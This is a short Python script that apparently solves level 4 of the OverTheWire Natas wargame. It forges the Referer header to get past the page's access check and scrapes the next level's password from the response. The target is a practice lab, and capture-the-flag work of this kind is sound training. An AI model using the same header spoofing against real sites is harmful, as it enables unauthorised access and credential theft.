import requests
import re
from requests.auth import HTTPBasicAuth
def solve4(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    session.headers["Referer"] = "http://natas5.natas.labs.overthewire.org/"
    resp = session.get("http://natas4.natas.labs.overthewire.org/")
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw
